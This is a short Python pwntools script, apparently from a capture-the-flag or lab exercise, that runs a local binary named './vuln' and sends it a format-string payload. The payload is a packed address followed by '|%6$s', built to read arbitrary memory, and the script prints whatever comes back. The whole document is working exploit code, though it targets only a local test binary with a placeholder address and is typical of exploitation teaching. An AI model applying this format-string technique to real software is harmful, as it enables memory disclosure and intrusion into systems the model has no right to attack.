from pwn import *

elf = context.binary = ELF('./vuln')
io = process()

payload = p32(0x41424344)
payload += b'|%6$s'


io.sendline(payload)
log.info(io.clean())